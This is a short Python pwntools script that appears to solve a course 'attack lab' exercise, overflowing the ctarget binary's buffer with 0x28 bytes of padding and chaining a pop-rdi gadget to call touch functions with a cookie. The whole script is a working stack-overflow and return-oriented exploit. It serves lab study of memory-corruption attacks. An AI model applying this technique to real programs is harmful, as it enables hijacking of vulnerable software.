from pwn import *

p = process(argv=['./ctarget', '-q'])

def s64(a):
    return ''.join([chr(x) for x in p64(a)])
def s32(a):
    return ''.join([chr(x) for x in p32(a)])

padding = ''.ljust(0x28, 'A')
touch1 = 0x4017C0
touch2 = 0x4017EC
pop_rdi_ret = 0x40141b
cookie = 0x59b997fa
cookie_addr = 0x6044E4

touch3 = 0x4018FA

payload1 = padding + s64(touch1)
payload2 = padding + s64(pop_rdi_ret) + s64(cookie) + s64(touch2)
payload3 = padding + s64(pop_rdi_ret) + s64(cookie_addr) + s64(touch3)

p.sendline(payload3)
p.interactive()